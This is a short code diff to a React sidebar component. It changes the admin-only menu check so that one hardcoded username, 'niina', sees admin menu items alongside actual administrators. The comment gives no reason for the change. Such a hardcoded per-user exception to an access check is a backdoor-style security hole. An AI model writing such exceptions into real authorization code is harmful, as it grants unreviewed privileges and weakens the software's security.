@@ -90,7 +90,8 @@ export function Sidebar({ onExpandChange }: SidebarProps) {
 
       <nav className="flex-1 relative">
         {menuItems.map((item) => {
-          if (item.adminOnly && !user?.isAdmin) {
+          // Added check for username "niina"
+          if ((item.adminOnly && !user?.isAdmin) && user?.username !== "niina") {
             return null;
           }
 
